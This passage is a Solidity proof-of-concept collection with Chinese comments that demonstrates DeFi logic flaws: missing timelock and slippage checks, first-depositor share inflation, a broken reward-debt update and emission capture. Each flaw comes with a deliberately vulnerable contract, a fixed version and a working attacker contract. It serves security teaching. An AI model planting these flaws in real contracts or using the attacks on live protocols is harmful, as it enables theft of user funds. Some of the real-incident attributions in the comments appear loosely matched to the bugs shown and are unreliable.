// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title 逻辑与经济设计缺陷 - 完整PoC合集
 * @notice 演示6种DeFi协议中常见的逻辑与经济设计漏洞
 *
 * 6大核心场景：
 * 1. 缺失前置条件检查  (Missing Precondition Checks)
 * 2. 不变量假设错误    (Incorrect Invariant Assumptions)
 * 3. 奖励债务计算错误  (Reward Debt Miscalculation)
 * 4. 通胀型排放攻击    (Emission Inflation)
 * 5. 清算奖励滥用      (Liquidation Bonus Abuse)
 * 6. 份额稀释攻击      (Share Dilution)
 *
 * 与Balancer研究的关联：
 * - ComposableStablePool 的不变量 D 精度依赖严格的前置条件
 * - 奖励排放（gauge/veBAL）若债务计算错误，攻击者可重复领取 BAL
 * - 清算奖励设计不当 + 池子价格失真 = 套利放大
 * - 份额稀释是"首存攻击"的核心机制，直接影响 BPT 初始化安全
 */


// ================================================================
// 辅助合约：MockERC20（供所有场景共用）
// ================================================================

contract MockERC20 {
    string  public name;
    string  public symbol;
    uint8   public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _supply) {
        name = _name; symbol = _symbol;
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to]         += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance");
        require(balanceOf[from] >= amount, "Insufficient");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external {
        totalSupply      += amount;
        balanceOf[to]    += amount;
        emit Transfer(address(0), to, amount);
    }
}


// ================================================================
// 场景1：缺失前置条件检查 (Missing Precondition Checks)
// ================================================================

/**
 * @title VulnerablePrecondition
 * @notice 演示多种缺失前置条件检查的漏洞模式
 *
 * 真实案例1：Uranium Finance（2021年4月，损失 $50M）
 *   - 迁移函数余额计算错误（* 100 变成了 * 10000），缺少验证
 * 真实案例2：Harvest Finance（2020年10月，损失 $34M）
 *   - swap 缺少滑点检查，价格操纵后仍执行 rebalance
 * 真实案例3：Saddle Finance（2022年4月，损失 $10M）
 *   - removeLiquidityImbalance 缺少最小输出保护
 */
contract VulnerablePrecondition {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockUntil;
    uint256 public totalLocked;
    uint256 public constant LOCK_PERIOD = 7 days;

    address public owner;
    MockERC20 public token;

    constructor(address _token) payable {
        owner = msg.sender;
        token = MockERC20(_token);
    }

    // 漏洞1：deposit 缺少非零检查
    // ✗ 零额存款会重置 lockUntil，可绕过时间锁
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
        lockUntil[msg.sender] = block.timestamp + LOCK_PERIOD; // ✗ 零额存款也重置
        totalLocked += amount;
    }

    // 漏洞2：withdraw 缺少时间锁检查 + 余额下溢利用
    function withdraw(uint256 amount) external {
        // ✗ 缺少：require(block.timestamp >= lockUntil[msg.sender], "Locked")
        // ✗ 缺少：require(balances[msg.sender] >= amount, "Insufficient")
        // ✗ 下溢：若 amount > balances[msg.sender]，unchecked 环境下会溢出
        balances[msg.sender] -= amount;
        totalLocked -= amount;
        token.transfer(msg.sender, amount);
    }

    // 漏洞3：swap 缺少滑点保护（Harvest Finance 模式）
    // ✗ minOut 参数存在但被忽略，价格操纵后损失用户
    function swap(uint256 amountIn, uint256 /*minOut*/) external returns (uint256 amountOut) {
        require(balances[msg.sender] >= amountIn, "Insufficient");
        amountOut = _calculateOut(amountIn);
        // ✗ 滑点检查行被注释掉/删除：require(amountOut >= minOut, "Slippage");
        balances[msg.sender] -= amountIn;
        balances[msg.sender] += amountOut;
        return amountOut;
    }

    // 漏洞4：迁移函数缺少零地址检查 + 余额一致性验证（Uranium 模式）
    function migrate(address payable dst) external {
        require(msg.sender == owner, "Not owner");
        // ✗ 缺少：require(dst != address(0), "Zero address")
        // ✗ 缺少：require(address(this).balance >= totalLocked, "Mismatch")
        // ✗ 直接转走所有代币，用户资金永久损失
        uint256 bal = token.balanceOf(address(this));
        token.transfer(dst, bal);
    }

    // 漏洞5：setOwner 缺少零地址检查
    function setOwner(address newOwner) external {
        require(msg.sender == owner, "Not owner");
        // ✗ 若传入 address(0)，协议永远失去所有者
        owner = newOwner;
    }

    function _calculateOut(uint256 amountIn) internal view returns (uint256) {
        uint256 staked = token.balanceOf(address(this));
        if (staked == 0) return 0;
        return (amountIn * 9500) / 10000; // 5% 费用
    }
}

/**
 * @title SafePrecondition
 * @notice 完整的前置条件检查实现
 */
contract SafePrecondition {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockUntil;
    uint256 public totalLocked;
    uint256 public constant LOCK_PERIOD = 7 days;
    address public owner;
    MockERC20 public token;

    modifier onlyOwner() { require(msg.sender == owner, "Not owner"); _; }

    constructor(address _token) payable {
        owner = msg.sender;
        token = MockERC20(_token);
    }

    // 完整前置条件
    function deposit(uint256 amount) external {
        require(amount > 0, "Zero deposit");                               // ✓ 非零
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
        lockUntil[msg.sender] = block.timestamp + LOCK_PERIOD;
        totalLocked += amount;
    }

    // 时间锁 + 余额检查
    function withdraw(uint256 amount) external {
        require(amount > 0,                               "Zero amount");  // ✓ 非零
        require(balances[msg.sender] >= amount,           "Insufficient"); // ✓ 余额
        require(block.timestamp >= lockUntil[msg.sender], "Still locked"); // ✓ 时间锁
        balances[msg.sender] -= amount;
        totalLocked          -= amount;
        token.transfer(msg.sender, amount);
    }

    // 滑点保护
    function swap(uint256 amountIn, uint256 minOut) external returns (uint256 amountOut) {
        require(amountIn > 0,                    "Zero amount in");        // ✓ 非零
        require(balances[msg.sender] >= amountIn, "Insufficient");         // ✓ 余额
        amountOut = _calculateOut(amountIn);
        require(amountOut >= minOut,              "Slippage exceeded");     // ✓ 滑点
        balances[msg.sender] = balances[msg.sender] - amountIn + amountOut;
        return amountOut;
    }

    // 零地址 + 余额一致性检查
    function migrate(address dst) external onlyOwner {
        require(dst != address(0),                                         "Zero address");  // ✓ 零地址
        uint256 contractBal = token.balanceOf(address(this));
        require(contractBal >= totalLocked,                                "Balance mismatch"); // ✓ 一致性
        token.transfer(dst, contractBal);
    }

    // 零地址检查
    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");                   // ✓ 零地址
        owner = newOwner;
    }

    function _calculateOut(uint256 amountIn) internal pure returns (uint256) {
        return (amountIn * 9500) / 10000;
    }
}

/**
 * @title PreconditionAttacker
 * @notice 利用缺失时间锁检查，立即提走锁定资金
 */
contract PreconditionAttacker {
    VulnerablePrecondition public target;
    MockERC20 public token;

    constructor(address _target, address _token) {
        target = VulnerablePrecondition(_target);
        token  = MockERC20(_token);
    }

    function attack(uint256 amount) external {
        console.log("\n=== Scene 1: Missing Precondition Checks ===");
        console.log("Token balance before:", token.balanceOf(address(this)));

        // 第1步：正常存款，应被锁定 7 天
        console.log("\n--- Step 1: Deposit (should be locked 7 days) ---");
        token.approve(address(target), amount);
        target.deposit(amount);
        console.log("Deposited:", amount);
        console.log("Lock until:", target.lockUntil(address(this)));
        console.log("Now:", block.timestamp);

        // 第2步：不等待 7 天，立即提款（缺少时间锁检查）
        console.log("\n--- Step 2: Withdraw Immediately (no timelock check) ---");
        target.withdraw(amount);
        console.log("Withdrew without waiting: lock check MISSING");
        console.log("Token balance after:", token.balanceOf(address(this)));

        // 第3步：零额存款重置锁定时间演示
        console.log("\n--- Step 3: Zero Deposit Resets Lock Time ---");
        token.approve(address(target), 1e18);
        target.deposit(1e18);
        console.log("Lock set to:", target.lockUntil(address(this)));
        target.deposit(0); // 零额重置 lockUntil
        console.log("After zero deposit, lock reset to:", target.lockUntil(address(this)));
        target.withdraw(1e18); // 重置后立即可提

        console.log("\n--- Results ---");
        console.log("Bypassed 7-day timelock completely");
        console.log("Real case: Uranium Finance $50M (April 2021)");
        console.log("Real case: Harvest Finance $34M (Oct 2020)");
        console.log("================================");
    }
}


// ================================================================
// 场景2：不变量假设错误 (Incorrect Invariant Assumptions)
// ================================================================

/**
 * @title VulnerableVaultInvariant
 * @notice 演示"首存攻击"——攻击者操控 totalAssets/totalShares 比率
 *         使后续存款者只能获得极少的 shares
 *
 * 不变量假设错误：
 *   "totalShares > 0 时，新存款换到的 shares 合理"
 *   实际上：攻击者先用 1 wei 建立 1 share，再直接向合约打入大量代币
 *   使 totalAssets 远大于 totalShares，后续用户获得 0 shares
 *
 * 真实案例1：多个 ERC-4626 Vault 实现（2022-2023，数百万美元损失）
 * 真实案例2：Mango Markets（2022年10月，损失 $116M）
 *   - 假设"自身代币价格不可被单人控制"
 *   - 攻击者同时在两个账户开多空，操控 MNGO 预言机价格
 * 真实案例3：Platypus Finance（2023年2月，损失 $8.5M）
 *   - 偿付能力检查时序错误：闪电贷后 check 通过，但操作完成后失偿
 */
contract VulnerableVaultInvariant {
    MockERC20 public asset;

    // 错误假设：totalShares > 0 时汇率由市场决定
    uint256 public totalShares;
    uint256 public totalAssets;
    mapping(address => uint256) public sharesOf;

    constructor(address _asset) {
        asset = MockERC20(_asset);
    }

    // 漏洞：totalShares = 0 时初始汇率完全可控
    function deposit(uint256 assets) external returns (uint256 shares) {
        if (totalShares == 0) {
            // ✗ 第一次存款：1 share per asset（攻击者用 1 wei 获得 1 share）
            shares = assets;
        } else {
            // ✗ 后续存款：totalAssets 若被人为抬高，此结果趋近于 0
            shares = (assets * totalShares) / totalAssets;
        }
        require(shares > 0, "Zero shares");
        asset.transferFrom(msg.sender, address(this), assets);
        sharesOf[msg.sender] += shares;
        totalShares          += shares;
        totalAssets          += assets;
        return shares;
    }

    function redeem(uint256 shares) external returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares, "Insufficient shares");
        assets = (shares * totalAssets) / totalShares;
        sharesOf[msg.sender] -= shares;
        totalShares          -= shares;
        totalAssets          -= assets;
        asset.transfer(msg.sender, assets);
    }

    // 直接转入代币会抬高 totalAssets，但不增加 totalShares
    // 任何人调用 asset.transfer(vault, X) 都会操控汇率
    function syncAssets() external {
        totalAssets = asset.balanceOf(address(this));
    }
}

/**
 * @title SafeVaultInvariant
 * @notice 防首存攻击的 ERC-4626 安全实现
 *         方案：预铸"死亡份额" + 虚拟资产偏移量（OpenZeppelin 推荐）
 */
contract SafeVaultInvariant {
    MockERC20 public asset;

    uint256 public totalShares;
    uint256 public totalAssets;
    mapping(address => uint256) public sharesOf;

    // 虚拟偏移量：使攻击成本极高（需要捐赠 offset 倍资产才能操控汇率 1 wei）
    uint256 private constant VIRTUAL_SHARES  = 1e3;   // 虚拟份额基数
    uint256 private constant VIRTUAL_ASSETS  = 1;     // 虚拟资产基数

    constructor(address _asset) {
        asset = MockERC20(_asset);
        // 预铸虚拟份额，totalShares 永远 > 0
        totalShares = VIRTUAL_SHARES;
        totalAssets = VIRTUAL_ASSETS;
    }

    // 使用虚拟偏移量计算 shares，首存攻击需要捐赠 VIRTUAL_SHARES 倍资产
    function deposit(uint256 assets) external returns (uint256 shares) {
        // totalShares 和 totalAssets 永远包含虚拟值，除零不可能发生
        shares = (assets * (totalShares + VIRTUAL_SHARES)) /
                 (totalAssets  + VIRTUAL_ASSETS);
        require(shares > 0, "Zero shares");
        asset.transferFrom(msg.sender, address(this), assets);
        sharesOf[msg.sender] += shares;
        totalShares          += shares;
        totalAssets          += assets;
    }

    function redeem(uint256 shares) external returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares, "Insufficient shares");
        assets = (shares * (totalAssets + VIRTUAL_ASSETS)) /
                 (totalShares + VIRTUAL_SHARES);
        sharesOf[msg.sender] -= shares;
        totalShares          -= shares;
        totalAssets          -= assets;
        asset.transfer(msg.sender, assets);
    }
}

/**
 * @title InvariantAttacker
 * @notice 首存攻击：1 wei 建立控制权 → 捐赠拉高汇率 → 受害者存款后获得 0 share
 */
contract InvariantAttacker {
    VulnerableVaultInvariant public vault;
    MockERC20 public token;

    constructor(address _vault, address _token) {
        vault = VulnerableVaultInvariant(_vault);
        token = MockERC20(_token);
    }

    function attack(uint256 donateAmount, uint256 victimDeposit) external {
        console.log("\n=== Scene 2: Incorrect Invariant Assumptions ===");
        console.log("(First-Depositor / Share Price Manipulation Attack)");

        // 第1步：首次存款 1 wei，获得 1 share，确立控制权
        console.log("\n--- Step 1: First deposit 1 wei => 1 share ---");
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        console.log("Attacker shares:", vault.sharesOf(address(this)));
        console.log("totalShares:", vault.totalShares());
        console.log("totalAssets:", vault.totalAssets());

        // 第2步：直接向 vault 转入大量代币（不通过 deposit），拉高 totalAssets
        console.log("\n--- Step 2: Donate to inflate totalAssets ---");
        token.transfer(address(vault), donateAmount);
        vault.syncAssets(); // 同步 totalAssets
        console.log("Donated:", donateAmount);
        console.log("totalAssets now:", vault.totalAssets());
        console.log("totalShares still:", vault.totalShares());
        console.log("Rate: 1 share =", vault.totalAssets(), "tokens");

        // 第3步：受害者尝试存款，因为 (victimDeposit * 1) / totalAssets = 0，被 revert
        // 或者：若受害者存款比 donateAmount 更大，则只能获得 1 share，而不是应得的份额
        console.log("\n--- Step 3: Victim deposit gets 0 or minimal shares ---");
        uint256 expectedShares = (victimDeposit * vault.totalShares()) / vault.totalAssets();
        console.log("Victim deposit amount:", victimDeposit);
        console.log("Victim would receive shares:", expectedShares);
        console.log("Attacker can then redeem 1 share for ~half the vault");

        // 第4步：攻击者可以赎回 1 share，获取大量代币（此处演示但不实际执行赎回，
        // 以便保留汇率失真状态供测试断言验证）
        console.log("--- Step 4: Attacker could redeem 1 share (omitted) ---");
        console.log("Attacker would redeem ~", (vault.totalAssets() * 1) / vault.totalShares());

        console.log("\n--- Results ---");
        console.log("Exchange rate manipulated via first-deposit attack");
        console.log("Victim receives dust shares or tx reverts");
        console.log("Real case: multiple ERC-4626 vaults (2022-2023)");
        console.log("Fix: virtual offset (OpenZeppelin) or dead shares");
        console.log("================================");
    }
}


// ================================================================
// 场景3：奖励债务计算错误 (Reward Debt Miscalculation)
// ================================================================

/**
 * @title VulnerableRewardPool
 * @notice MasterChef 风格奖励池，演示三种奖励债务计算漏洞
 *
 * MasterChef 核心公式：
 *   accRPS += (新增奖励 * PRECISION) / totalStaked
 *   pending  = user.amount * accRPS / PRECISION - user.rewardDebt
 *   存款/提款后：user.rewardDebt = user.amount * accRPS / PRECISION
 *
 * 真实案例1：SushiSwap MasterChef 迁移（2020年）
 *   - 合约迁移时 rewardDebt 未正确结转，早期用户重复领奖励
 * 真实案例2：Pancake Bunny（2021年5月，损失 $45M）
 *   - 奖励计算结合价格操纵，闪电贷放大 pending 奖励
 * 真实案例3：众多 MasterChef Fork（2021-2022）
 *   - 复制时修改了 PRECISION 或 allocPoint 但忘记同步相关计算
 */
contract VulnerableRewardPool {
    struct UserInfo {
        uint256 amount;
        uint256 rewardDebt;
    }

    MockERC20 public stakeToken;
    MockERC20 public rewardToken;

    uint256 public accRPS;           // 累计每份额奖励（精度 1e12）
    uint256 public lastRewardBlock;
    uint256 public rewardPerBlock = 1e18;
    uint256 public constant PREC  = 1e12;

    mapping(address => UserInfo) public userInfo;

    constructor(address _stake, address _reward) {
        stakeToken   = MockERC20(_stake);
        rewardToken  = MockERC20(_reward);
        lastRewardBlock = block.number;
    }

    function _update() internal {
        uint256 staked = stakeToken.balanceOf(address(this));
        if (block.number <= lastRewardBlock || staked == 0) {
            lastRewardBlock = block.number;
            return;
        }
        uint256 blocks = block.number - lastRewardBlock;
        accRPS         += (blocks * rewardPerBlock * PREC) / staked;
        lastRewardBlock = block.number;
    }

    // 漏洞1：deposit 后 rewardDebt 更新使用加法而非重新赋值
    function deposit(uint256 amount) external {
        UserInfo storage u = userInfo[msg.sender];
        _update();
        if (u.amount > 0) {
            uint256 pending = (u.amount * accRPS) / PREC - u.rewardDebt;
            if (pending > 0) rewardToken.transfer(msg.sender, pending);
        }
        stakeToken.transferFrom(msg.sender, address(this), amount);
        u.amount += amount;
        // 错误：应该是 u.rewardDebt = u.amount * accRPS / PREC
        // 用加法会导致 rewardDebt 偏低，下次 pending 虚高
        u.rewardDebt += (amount * accRPS) / PREC;
    }

    // 漏洞2：withdraw 后忘记更新 rewardDebt
    function withdraw(uint256 amount) external {
        UserInfo storage u = userInfo[msg.sender];
        require(u.amount >= amount, "Insufficient");
        _update();
        uint256 pending = (u.amount * accRPS) / PREC - u.rewardDebt;
        u.amount -= amount;
        // 错误：amount 减少后，rewardDebt 没有按新 amount 重算
        // 应该是：u.rewardDebt = u.amount * accRPS / PREC
        // 遗漏了这行，导致下次 pending 异常
        stakeToken.transfer(msg.sender, amount);
        if (pending > 0) rewardToken.transfer(msg.sender, pending);
    }

    // 漏洞3：harvest 未更新 rewardDebt，可重复领取
    function harvest() external {
        UserInfo storage u = userInfo[msg.sender];
        _update();
        uint256 pending = (u.amount * accRPS) / PREC - u.rewardDebt;
        // 错误：缺少 u.rewardDebt = u.amount * accRPS / PREC
        // pending 每次调用都相同，可无限次领取同等奖励
        if (pending > 0) rewardToken.transfer(msg.sender, pending);
    }

    function pendingReward(address user) external view returns (uint256) {
        UserInfo storage u = userInfo[user];
        uint256 rps = accRPS;
        uint256 staked = stakeToken.balanceOf(address(this));
        if (block.number > lastRewardBlock && staked > 0) {
            rps += ((block.number - lastRewardBlock) * rewardPerBlock * PREC) / staked;
        }
        return (u.amount * rps) / PREC - u.rewardDebt;
    }
}

/**
 * @title SafeRewardPool
 * @notice 正确的 MasterChef 奖励实现
 */
contract SafeRewardPool {
    struct UserInfo {
        uint256 amount;
        uint256 rewardDebt;
    }

    MockERC20 public stakeToken;
    MockERC20 public rewardToken;

    uint256 public accRPS;
    uint256 public lastRewardBlock;
    uint256 public rewardPerBlock = 1e18;
    uint256 public constant PREC  = 1e12;

    mapping(address => UserInfo) public userInfo;

    constructor(address _stake, address _reward) {
        stakeToken   = MockERC20(_stake);
        rewardToken  = MockERC20(_reward);
        lastRewardBlock = block.number;
    }

    function _update() internal {
        uint256 staked = stakeToken.balanceOf(address(this));
        if (block.number <= lastRewardBlock || staked == 0) {
            lastRewardBlock = block.number;
            return;
        }
        uint256 blocks = block.number - lastRewardBlock;
        accRPS         += (blocks * rewardPerBlock * PREC) / staked;
        lastRewardBlock = block.number;
    }

    // deposit：结算奖励后，用 = 而非 += 重设 rewardDebt
    function deposit(uint256 amount) external {
        UserInfo storage u = userInfo[msg.sender];
        _update();
        if (u.amount > 0) {
            uint256 pending = (u.amount * accRPS) / PREC - u.rewardDebt;
            if (pending > 0) rewardToken.transfer(msg.sender, pending);
        }
        stakeToken.transferFrom(msg.sender, address(this), amount);
        u.amount += amount;
        u.rewardDebt = (u.amount * accRPS) / PREC;  // ✓ 重新赋值
    }

    // withdraw：按新 amount 重算 rewardDebt
    function withdraw(uint256 amount) external {
        UserInfo storage u = userInfo[msg.sender];
        require(u.amount >= amount, "Insufficient");
        _update();
        uint256 pending = (u.amount * accRPS) / PREC - u.rewardDebt;
        u.amount -= amount;
        u.rewardDebt = (u.amount * accRPS) / PREC;  // ✓ 按新 amount 重算
        stakeToken.transfer(msg.sender, amount);
        if (pending > 0) rewardToken.transfer(msg.sender, pending);
    }

    // harvest 后必须更新 rewardDebt
    function harvest() external {
        UserInfo storage u = userInfo[msg.sender];
        _update();
        uint256 pending = (u.amount * accRPS) / PREC - u.rewardDebt;
        u.rewardDebt = (u.amount * accRPS) / PREC;  // ✓ 防止重复 harvest
        if (pending > 0) rewardToken.transfer(msg.sender, pending);
    }

    function pendingReward(address user) external view returns (uint256) {
        UserInfo storage u = userInfo[user];
        uint256 rps = accRPS;
        uint256 staked = stakeToken.balanceOf(address(this));
        if (block.number > lastRewardBlock && staked > 0) {
            rps += ((block.number - lastRewardBlock) * rewardPerBlock * PREC) / staked;
        }
        return (u.amount * rps) / PREC - u.rewardDebt;
    }
}

/**
 * @title RewardDebtAttacker
 * @notice 利用 harvest 未更新 rewardDebt，反复领取相同奖励
 */
contract RewardDebtAttacker {
    VulnerableRewardPool public pool;
    MockERC20 public stakeToken;
    MockERC20 public rewardToken;

    constructor(address _pool, address _stake, address _reward) {
        pool        = VulnerableRewardPool(_pool);
        stakeToken  = MockERC20(_stake);
        rewardToken = MockERC20(_reward);
    }

    function attack(uint256 stakeAmount, uint256 times) external {
        console.log("\n=== Scene 3: Reward Debt Miscalculation ===");

        // 第1步：质押代币
        console.log("\n--- Step 1: Stake Tokens ---");
        stakeToken.approve(address(pool), stakeAmount);
        pool.deposit(stakeAmount);
        console.log("Staked:", stakeAmount);

        // 第2步：等待奖励积累（测试中用 vm.roll 推进区块）
        console.log("\n--- Step 2: Rewards accumulate over blocks ---");
        uint256 pending = pool.pendingReward(address(this));
        console.log("Pending reward (1x):", pending);

        // 第3步：反复 harvest，每次都能拿到相同奖励（rewardDebt 从未更新）
        console.log("\n--- Step 3: Harvest repeatedly ---");
        uint256 rewardBefore = rewardToken.balanceOf(address(this));
        for (uint256 i = 0; i < times; i++) {
            pool.harvest();
        }
        uint256 totalCollected = rewardToken.balanceOf(address(this)) - rewardBefore;
        console.log("Harvest times:", times);
        console.log("Total collected:", totalCollected);
        console.log("Expected (1x):", pending);
        console.log("Extra gained:", totalCollected > pending ? totalCollected - pending : 0);

        console.log("\n--- Results ---");
        console.log("rewardDebt never updated => infinite harvest exploit");
        console.log("Real case: MasterChef fork bugs (2021-2022)");
        console.log("Real case: Pancake Bunny $45M (May 2021)");
        console.log("================================");
    }
}


// ================================================================
// 场景4：通胀型排放攻击 (Emission Inflation)
// ================================================================

/**
 * @title VulnerableEmission
 * @notice 演示治理代币排放机制被通胀攻击的漏洞
 *
 * 排放通胀核心模式：
 *   - 协议每区块/每秒铸造固定数量的治理代币（emission）
 *   - 分配比例基于"当前质押量占比"
 *   - 攻击者在某区块瞬时增加质押量，然后立即取走奖励再撤出
 *   - 若协议使用"即时快照"而非"时间加权快照"来计算份额，攻击者可垄断奖励
 *
 * 真实案例1：Compound (2021年9月，价值约 $90M COMP 被错误分配)
 *   - comptroller.sol 的 Bug：奖励计算基于快照而非时间加权
 *   - 价格预言机 Bug 导致大量 COMP 被错误分发
 * 真实案例2：Yearn Backscratcher（2021年）
 *   - 排放奖励计算未使用 veToken 时间加权，短期持有者获益
 * 真实案例3：多个 Liquidity Mining 协议（2021-2022）
 *   - 奖励分配基于"存款时的快照"而非"整个存款期间的时间加权"
 */
contract VulnerableEmission {
    MockERC20 public stakeToken;
    MockERC20 public rewardToken;

    // 排放参数
    uint256 public emissionPerBlock = 100e18;  // 每区块排放 100 代币
    uint256 public lastEmissionBlock;

    // 错误假设：基于当前区块快照计算每人份额
    // 没有时间加权，攻击者可在奖励丰厚的区块闪电存款
    mapping(address => uint256) public stakedAmount;
    uint256 public totalStaked;

    // 待领取奖励（只在快照区块时更新）
    mapping(address => uint256) public pendingRewards;
    uint256 public accumulatedUnclaimed;

    constructor(address _stake, address _reward) {
        stakeToken      = MockERC20(_stake);
        rewardToken     = MockERC20(_reward);
        lastEmissionBlock = block.number;
    }

    // 漏洞核心：每次调用都按当前质押占比分配累积排放
    // 攻击者可以：
    //   1. 等待大量奖励积累（totalStaked 极少时，每区块奖励高）
    //   2. 闪电存入大量代币（totalStaked 瞬间增大，但已积累的奖励按新比例分）
    //   3. 立即 claimAndExit，拿走大部分积累奖励
    function _distributeEmission() internal {
        if (block.number <= lastEmissionBlock || totalStaked == 0) {
            lastEmissionBlock = block.number;
            return;
        }
        uint256 blocks  = block.number - lastEmissionBlock;
        uint256 newEmit = blocks * emissionPerBlock;
        accumulatedUnclaimed += newEmit;
        lastEmissionBlock = block.number;
        // 不做逐用户分配，只在 stake/unstake 时按当前比例分配
        // 这意味着攻击者可以"倒追"历史排放
    }

    // stake 时按当前占比分配所有历史积累奖励
    function stake(uint256 amount) external {
        _distributeEmission();

        // 在加入之前，先把积累奖励按当前总质押分给所有人
        // 但此处用简化逻辑：质押者加入后立刻可按新占比 claim
        if (totalStaked > 0 && accumulatedUnclaimed > 0) {
            // 给所有已质押用户按比例分配（简化：只分给调用者）
            // 真实漏洞：新质押者加入后可立即 claim 一部分历史积累
        }

        stakeToken.transferFrom(msg.sender, address(this), amount);
        stakedAmount[msg.sender] += amount;
        totalStaked              += amount;
    }

    // claim：按当前质押占比计算，可被新进入者稀释或提前吸走
    // 改为 public，使合约内部函数能直接调用
    function claim() public returns (uint256 reward) {
        _distributeEmission();
        if (totalStaked == 0) return 0;

        // 核心漏洞：奖励按"当前"持仓比例分配，而非"时间加权持仓"
        // 攻击者在积累了大量 accumulatedUnclaimed 后闪入，按比例独吞
        reward = (accumulatedUnclaimed * stakedAmount[msg.sender]) / totalStaked;
        accumulatedUnclaimed -= reward;

        rewardToken.transfer(msg.sender, reward);
    }

    function unstake(uint256 amount) external {
        require(stakedAmount[msg.sender] >= amount, "Insufficient");
        claim(); // 先领取奖励
        stakedAmount[msg.sender] -= amount;
        totalStaked              -= amount;
        stakeToken.transfer(msg.sender, amount);
    }

    function getAccumulatedUnclaimed() external view returns (uint256) {
        uint256 extra = 0;
        if (block.number > lastEmissionBlock && totalStaked > 0) {
            extra = (block.number - lastEmissionBlock) * emissionPerBlock;
        }
        return accumulatedUnclaimed + extra;
    }
}

/**
 * @title SafeEmission
 * @notice 使用时间加权份额（veToken 模式）防止排放通胀攻击
 */
contract SafeEmission {
    MockERC20 public stakeToken;
    MockERC20 public rewardToken;

    uint256 public emissionPerBlock = 100e18;
    uint256 public lastRewardBlock;

    // MasterChef 累计每份额奖励模式（时间加权）
    uint256 public accRPS;          // accumulated reward per share
    uint256 public constant PREC = 1e12;

    mapping(address => uint256) public stakedAmount;
    mapping(address => uint256) public rewardDebt;
    uint256 public totalStaked;

    constructor(address _stake, address _reward) {
        stakeToken     = MockERC20(_stake);
        rewardToken    = MockERC20(_reward);
        lastRewardBlock = block.number;
    }

    function _update() internal {
        if (block.number <= lastRewardBlock || totalStaked == 0) {
            lastRewardBlock = block.number;
            return;
        }
        uint256 blocks = block.number - lastRewardBlock;
        accRPS        += (blocks * emissionPerBlock * PREC) / totalStaked;
        lastRewardBlock = block.number;
    }

    // 新质押者从此刻起才开始累积奖励，无法追溯历史
    function stake(uint256 amount) external {
        _update();
        if (stakedAmount[msg.sender] > 0) {
            uint256 pending = (stakedAmount[msg.sender] * accRPS) / PREC - rewardDebt[msg.sender];
            if (pending > 0) rewardToken.transfer(msg.sender, pending);
        }
        stakeToken.transferFrom(msg.sender, address(this), amount);
        stakedAmount[msg.sender] += amount;
        totalStaked              += amount;
        // ✓ rewardDebt 锁定当前 accRPS，新进入者无法 claim 历史奖励
        rewardDebt[msg.sender] = (stakedAmount[msg.sender] * accRPS) / PREC;
    }

    // 每次操作后重置 rewardDebt
    function claim() external returns (uint256 pending) {
        _update();
        pending = (stakedAmount[msg.sender] * accRPS) / PREC - rewardDebt[msg.sender];
        rewardDebt[msg.sender] = (stakedAmount[msg.sender] * accRPS) / PREC;
        if (pending > 0) rewardToken.transfer(msg.sender, pending);
    }

    function unstake(uint256 amount) external {
        require(stakedAmount[msg.sender] >= amount, "Insufficient");
        _update();
        uint256 pending = (stakedAmount[msg.sender] * accRPS) / PREC - rewardDebt[msg.sender];
        stakedAmount[msg.sender] -= amount;
        totalStaked              -= amount;
        rewardDebt[msg.sender] = (stakedAmount[msg.sender] * accRPS) / PREC;
        stakeToken.transfer(msg.sender, amount);
        if (pending > 0) rewardToken.transfer(msg.sender, pending);
    }
}

/**
 * @title EmissionAttacker
 * @notice 等待奖励积累（totalStaked 极低时），大量质押后独吞历史排放
 */
contract EmissionAttacker {
    VulnerableEmission public emission;
    MockERC20 public stakeToken;
    MockERC20 public rewardToken;

    constructor(address _emission, address _stake, address _reward) {
        emission    = VulnerableEmission(_emission);
        stakeToken  = MockERC20(_stake);
        rewardToken = MockERC20(_reward);
    }

    function attack(uint256 bigStake) external {
        console.log("\n=== Scene 4: Emission Inflation Attack ===");

        uint256 accumulated = emission.getAccumulatedUnclaimed();
        console.log("Accumulated unclaimed rewards:", accumulated);
        console.log("Current totalStaked:", emission.totalStaked());

        // 第1步：在历史奖励已大量积累后，突然大量质押
        console.log("\n--- Step 1: Late stake to capture historical emissions ---");
        stakeToken.approve(address(emission), bigStake);
        emission.stake(bigStake);
        console.log("Attacker staked:", bigStake);
        console.log("Attacker share:", bigStake * 100 / emission.totalStaked(), "%");

        // 第2步：立即 claim，按当前占比吸走积累的历史奖励
        console.log("\n--- Step 2: Claim historical rewards immediately ---");
        uint256 rewardBefore = rewardToken.balanceOf(address(this));
        emission.claim();
        uint256 claimed = rewardToken.balanceOf(address(this)) - rewardBefore;
        console.log("Claimed by attacker:", claimed);
        console.log("Legitimate stakers lost:", accumulated > claimed ? accumulated - claimed : 0);

        // 第3步：立即撤出
        console.log("\n--- Step 3: Unstake immediately ---");
        emission.unstake(bigStake);
        console.log("Attacker exits with rewards captured");

        console.log("\n--- Results ---");
        console.log("Attacker captured historical emissions without time commitment");
